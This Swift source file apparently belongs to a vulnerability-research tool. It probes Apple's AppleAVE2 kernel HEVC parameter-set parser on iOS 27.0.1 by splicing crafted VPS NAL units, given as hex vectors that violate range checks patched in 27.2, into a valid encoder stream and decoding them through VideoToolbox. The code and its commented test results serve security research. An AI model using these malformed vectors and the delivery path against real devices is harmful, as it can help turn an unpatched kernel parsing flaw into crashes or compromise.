//
//  HEVCProbe.swift
//  Bench27
//
//  Probe for the AppleAVE2 kernel HEVC parameter-set parser.
//
//  Apple added a block of range checks to AppleAVE2 in iOS 27.2 that does not
//  exist in 27.0.1. The checks constrain, among others:
//
//      vps_max_layers_minus1      < 63     (pInfo+0x27f4)
//      vps_max_sub_layers_minus1  < 7      (pInfo+0x1888)
//      vps_num_layer_sets_minus1  < 16     (pInfo+0x27f8)
//      vps_num_hrd_parameters    <= 16     (pInfo+0x2c10)
//
//  This probe produces a *valid* parameter set from the hardware encoder, keeps
//  SPS/PPS, swaps only the VPS for a vector that violates those limits, and
//  pushes the result through VTDecompressionSession, which is the path that
//  hands parameter sets to the AppleAVE2 kext.
//
//  Vectors are byte-identical to what work/hevc_vps.py generates (verified by
//  round-trip against an independent RBSP parser), so there is no second
//  bitstream writer that could be wrong.
//

import Foundation
import VideoToolbox
import CoreMedia
import CoreVideo

// MARK: - decode result capture
//
// VTDecompressionSession calls its output callback as a plain C function
// pointer, so it cannot capture context. The per-frame result therefore lives
// in file scope; the probe is sequential, which is fine here.

private var gFrameStatus: OSStatus = -9999
private var gGotImage = false

private let gOutputCallback: VTDecompressionOutputCallback = {
    _refcon, _sourceRefcon, status, _infoFlags, imageBuffer, _pts, _duration in
    gFrameStatus = status
    if imageBuffer != nil { gGotImage = true }
}

// Held on the heap rather than as a global: a global struct containing a
// function pointer makes ld refuse to build chained fixups ("pointer not
// aligned") when linking with a plain swiftc invocation.
private let gCallbackRecord: UnsafeMutablePointer<VTDecompressionOutputCallbackRecord> = {
    let p = UnsafeMutablePointer<VTDecompressionOutputCallbackRecord>.allocate(capacity: 1)
    p.initialize(to: VTDecompressionOutputCallbackRecord(
        decompressionOutputCallback: gOutputCallback,
        decompressionOutputRefCon: nil))
    return p
}()

final class HEVCProbe {

    struct Vector {
        let name: String
        let hex: String
        let note: String
    }

    /// Annex-B VPS NAL units.
    ///
    /// Evidence from iOS 27.0.1 (24A446), builds 1.1 and 1.2:
    ///   base       -> fd accepted, session 0, decode 0
    ///   sub7       -> CoreMedia rejected it: userspace already bounds sub-layers
    ///   lays63     -> fd accepted, session 305 (0x131) - VPS/SPS inconsistency,
    ///                 because 64 layers cannot match a 1-layer SPS
    ///   sets1..255 -> fd accepted, session 0, decode 0
    ///
    /// So the layer-set count was never the cause of 305. What is still
    /// unproven is whether the patched VPS reaches the decoder at all, or
    /// VideoToolbox keeps using its own copy.
    ///
    /// vpsid15 is the control for exactly that: vps_video_parameter_set_id is
    /// 15 while the SPS references VPS id 0, so any decoder that really uses
    /// our parameter set MUST fail. If vpsid15 still reports a decoded image,
    /// the whole path is dead and the other vectors prove nothing.
    static let vectors: [Vector] = [
        Vector(name: "base",
               hex: "0000000140010c01ffff016000000300900000030000030078970240",
               note: "control: layers=0 sub=0 sets=0"),
        Vector(name: "vpsid15",
               hex: "000000014001fc01ffff016000000300900000030000030078970240",
               note: "control: VPS id 15, SPS wants id 0 - must fail to decode"),
        Vector(name: "sets1c",
               hex: "0000000140010c01ffff016000000300900000030000030078970148",
               note: "single layer, sets=1 (legal, inside limit)"),
        Vector(name: "sets17c",
               hex: "0000000140010c01ffff016000000300900000030000030078970025ffff20",
               note: "single layer, sets=17 (27.2 wants <16)"),
        Vector(name: "sets64c",
               hex: "0000000140010c01ffff0160000003009000000300000300789700083fffffffffffffffe4",
               note: "single layer, sets=64"),
        Vector(name: "sets255c",
               hex: "0000000140010c01ffff01600000030090000003000003007897000201fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc80",
               note: "single layer, sets=255"),
        Vector(name: "sets1023c",
               hex: "0000000140010c01ffff016000000300900000030000030078970000801fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc8",
               note: "single layer, sets=1023 (spec maximum)"),
        Vector(name: "sub7",
               hex: "0000000140010c0fffff0160000003009000000300000300780000972e5cb972e5cb8120",
               note: "vps_max_sub_layers_minus1=7 (27.2 wants <7)"),
        Vector(name: "lays63",
               hex: "0000000140010ff1ffff01600000030090000003000003007897fd7fffffffffffffff90",
               note: "vps_max_layers_minus1=63 (inconsistent with a 1-layer SPS)"),
    ]

    private let log: (String) -> Void
    private let stage: (String) -> Void
    private var cancelled = false

    init(log: @escaping (String) -> Void, stage: @escaping (String) -> Void) {
        self.log = log
        self.stage = stage
    }

    func cancel() { cancelled = true }

    // MARK: - driver

    func run() {
        log("[*] HEVC parameter-set probe")
        log("[*] device: \(deviceDescription())")
        log("[*] hardware HEVC decode: \(VTIsHardwareDecodeSupported(kCMVideoCodecType_HEVC))")
        // Resolved at runtime: the symbol is absent from older SDKs and a
        // direct reference would fail to compile against them.
        if let sym = dlsym(UnsafeMutableRawPointer(bitPattern: -2),
                           "VTRegisterSupplementalVideoDecoderIfAvailable") {
            typealias RegisterFn = @convention(c) (CMVideoCodecType) -> Void
            let fn = unsafeBitCast(sym, to: RegisterFn.self)
            fn(kCMVideoCodecType_HEVC)
            log("[*] supplemental decoder registration invoked")
        } else {
            log("[*] supplemental decoder symbol absent")
        }

        guard let baseline = makeBaseline() else {
            log("[-] could not obtain a baseline parameter set - aborted")
            return
        }
        let sets = Self.annexB(from: baseline.format).count
        log("[+] baseline: \(sets) bytes of HEVC parameter sets from the encoder")

        for v in Self.vectors {
            if cancelled { log("[!] cancelled by user"); return }
            probe(vector: v, baseline: baseline)
        }
        log("[*] probe complete - no crash")
    }

    // MARK: - 1. baseline from the hardware encoder

    private struct Baseline {
        let format: CMFormatDescription
        let sample: CMSampleBuffer
    }

    private func makeBaseline() -> Baseline? {
        var session: VTCompressionSession?
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: 64, height: 64,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: nil,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: nil,
            refcon: nil,
            compressionSessionOut: &session)
        guard st == noErr, let session else {
            log("[-] VTCompressionSessionCreate(HEVC) -> \(st)")
            return nil
        }

        var pb: CVPixelBuffer?
        CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            nil, &pb)
        guard let pixelBuffer = pb else {
            log("[-] CVPixelBufferCreate failed")
            return nil
        }

        VTCompressionSessionPrepareToEncodeFrames(session)

        var result: Baseline?
        let sem = DispatchSemaphore(value: 0)
        let rc = VTCompressionSessionEncodeFrame(
            session, imageBuffer: pixelBuffer,
            presentationTimeStamp: CMTime(value: 0, timescale: 30),
            duration: .invalid, frameProperties: nil, infoFlagsOut: nil
        ) { [self] status, _flags, sampleBuffer in
            if status != noErr || sampleBuffer == nil {
                self.log("[-] encoder produced no sample: \(status)")
                sem.signal(); return
            }
            guard let sb = sampleBuffer,
                  let fmt = CMSampleBufferGetFormatDescription(sb) else {
                sem.signal(); return
            }
            result = Baseline(format: fmt, sample: sb)
            sem.signal()
        }
        if rc != noErr { log("[-] EncodeFrame -> \(rc)") }
        _ = sem.wait(timeout: .now() + 5)
        _ = VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)

        if result == nil { log("[-] baseline capture timed out") }
        return result
    }

    // MARK: - 2. one vector

    private func probe(vector: Vector, baseline: Baseline) {
        let name = vector.name
        let crafted = Data(hexBytes: vector.hex)
        let baseSets = Self.annexB(from: baseline.format)
        let patched = Self.splice(base: baseSets, craftedVPS: crafted)

        log("---- \(name): \(vector.note), \(patched.count) bytes")

        stage("\(name): building format description")
        guard let fmt = Self.makeFormatDescription(from: patched) else {
            log("[-] \(name): CoreMedia rejected the parameter set")
            return
        }
        log("[+] \(name): format description accepted")

        // Two attempts per vector. The first lets VideoToolbox choose; the
        // second requires the hardware decoder. vpsid15 decoded in the first
        // pass, which contradicts the idea that the decoder consumes our VPS -
        // unless the first pass silently fell back to the software decoder.
        // Comparing the two settles it.
        attemptDecode(format: fmt, sample: baseline.sample, name: name,
                      tag: "any", spec: nil)
        if #available(iOS 17.0, *) {
            let hw = [kVTVideoDecoderSpecification_EnableHardwareAcceleratedVideoDecoder as String: true]
            attemptDecode(format: fmt, sample: baseline.sample, name: name,
                          tag: "hw", spec: hw as CFDictionary)
        }
    }

    private func attemptDecode(format: CMFormatDescription,
                               sample: CMSampleBuffer,
                               name: String,
                               tag: String,
                               spec: CFDictionary?) {
        stage("\(name)/\(tag): creating decompression session")
        gFrameStatus = -9999
        gGotImage = false

        var session: VTDecompressionSession?
        let cs = VTDecompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            formatDescription: format,
            decoderSpecification: spec,
            imageBufferAttributes: nil,
            outputCallback: gCallbackRecord,
            decompressionSessionOut: &session)
        log("[*] \(name)/\(tag): session -> \(cs)  \(Self.hex(cs))")
        guard cs == noErr, let session else { return }
        defer { VTDecompressionSessionInvalidate(session) }

        guard let sb = Self.rebuild(sample, format: format) else {
            log("[-] \(name)/\(tag): could not rebuild sample buffer")
            return
        }

        stage("\(name)/\(tag): decoding")
        var info = VTDecodeInfoFlags()
        let ds = VTDecompressionSessionDecodeFrame(
            session, sampleBuffer: sb,
            flags: [._EnableAsynchronousDecompression],
            frameRefcon: nil, infoFlagsOut: &info)
        _ = VTDecompressionSessionWaitForAsynchronousFrames(session)
        if gFrameStatus == -9999 {
            log("[!] \(name)/\(tag): no frame callback")
        } else {
            log("[*] \(name)/\(tag): frame \(gFrameStatus)  \(Self.hex(gFrameStatus)), image=\(gGotImage)")
        }
    }

    // MARK: - 3. parameter-set plumbing

    static func annexB(from fmt: CMFormatDescription) -> Data {
        var count = 0
        guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            fmt, parameterSetIndex: 0, parameterSetPointerOut: nil,
            parameterSetSizeOut: nil, parameterSetCountOut: &count,
            nalUnitHeaderLengthOut: nil) == noErr, count > 0 else { return Data() }
        var out = Data()
        for i in 0..<count {
            var ptr: UnsafePointer<UInt8>?
            var size = 0
            guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fmt, parameterSetIndex: i, parameterSetPointerOut: &ptr,
                parameterSetSizeOut: &size, parameterSetCountOut: nil,
                nalUnitHeaderLengthOut: nil) == noErr,
                  let p = ptr, size > 0 else { continue }
            out.append(contentsOf: [0, 0, 0, 1])
            out.append(p, count: size)
        }
        return out
    }

    static func nalUnits(_ data: Data) -> [Data] {
        let bytes = [UInt8](data)
        var starts: [Int] = []
        var i = 0
        while i + 2 < bytes.count {
            if bytes[i] == 0, bytes[i+1] == 0, bytes[i+2] == 1 {
                starts.append(i + 3); i += 3
            } else { i += 1 }
        }
        guard !starts.isEmpty else { return [] }
        var out: [Data] = []
        for (k, s) in starts.enumerated() {
            let e = (k + 1 < starts.count) ? starts[k+1] - 3 : bytes.count
            if e > s { out.append(Data(bytes[s..<e])) }
        }
        return out
    }

    static func splice(base: Data, craftedVPS: Data) -> Data {
        guard let vps = nalUnits(craftedVPS).first else { return base }
        var out = Data()
        var replaced = false
        for nal in nalUnits(base) {
            guard let first = nal.first else { continue }
            if (first >> 1) & 0x3F == 32 {
                out.append(contentsOf: [0, 0, 0, 1]); out.append(vps)
                replaced = true
            } else {
                out.append(contentsOf: [0, 0, 0, 1]); out.append(nal)
            }
        }
        if !replaced { out = Data([0, 0, 0, 1]) + vps + out }
        return out
    }

    static func makeFormatDescription(from annexB: Data) -> CMFormatDescription? {
        let bodies = nalUnits(annexB)
        guard !bodies.isEmpty else { return nil }

        var owned: [UnsafeMutablePointer<UInt8>] = []
        var ptrs: [UnsafePointer<UInt8>] = []
        var sizes: [Int] = []
        defer { owned.forEach { $0.deallocate() } }

        for body in bodies {
            let n = max(body.count, 1)
            let p = UnsafeMutablePointer<UInt8>.allocate(capacity: n)
            body.withUnsafeBytes { raw in
                if let src = raw.baseAddress { memcpy(p, src, body.count) }
            }
            owned.append(p)
            ptrs.append(UnsafePointer(p))
            sizes.append(body.count)
        }

        var fmt: CMFormatDescription?
        let st = ptrs.withUnsafeBufferPointer { pp -> OSStatus in
            sizes.withUnsafeBufferPointer { ss -> OSStatus in
                CMVideoFormatDescriptionCreateFromHEVCParameterSets(
                    allocator: kCFAllocatorDefault,
                    parameterSetCount: bodies.count,
                    parameterSetPointers: pp.baseAddress!,
                    parameterSetSizes: ss.baseAddress!,
                    nalUnitHeaderLength: 4,
                    extensions: nil,
                    formatDescriptionOut: &fmt)
            }
        }
        return st == noErr ? fmt : nil
    }

    static func rebuild(_ sample: CMSampleBuffer,
                        format: CMFormatDescription) -> CMSampleBuffer? {
        guard let block = CMSampleBufferGetDataBuffer(sample) else { return nil }
        var timing = CMSampleTimingInfo(
            duration: .invalid,
            presentationTimeStamp: CMSampleBufferGetPresentationTimeStamp(sample),
            decodeTimeStamp: .invalid)
        var size = CMBlockBufferGetDataLength(block)
        var out: CMSampleBuffer?
        let st = CMSampleBufferCreateReady(
            allocator: kCFAllocatorDefault,
            dataBuffer: block,
            formatDescription: format,
            sampleCount: 1,
            sampleTimingEntryCount: 1,
            sampleTimingArray: &timing,
            sampleSizeEntryCount: 1,
            sampleSizeArray: &size,
            sampleBufferOut: &out)
        if st != noErr { return nil }
        return out
    }

    private func deviceDescription() -> String {
        ProcessInfo.processInfo.operatingSystemVersionString
    }

    static func hex(_ status: OSStatus) -> String {
        String(format: "0x%08x", UInt32(bitPattern: status))
    }
}

// MARK: - helpers

extension Data {
    init(hexBytes: String) {
        var bytes: [UInt8] = []
        var idx = hexBytes.startIndex
        while idx < hexBytes.endIndex {
            let next = hexBytes.index(idx, offsetBy: 2, limitedBy: hexBytes.endIndex)
                ?? hexBytes.endIndex
            if let b = UInt8(hexBytes[idx..<next], radix: 16) { bytes.append(b) }
            idx = next
        }
        self.init(bytes)
    }
}
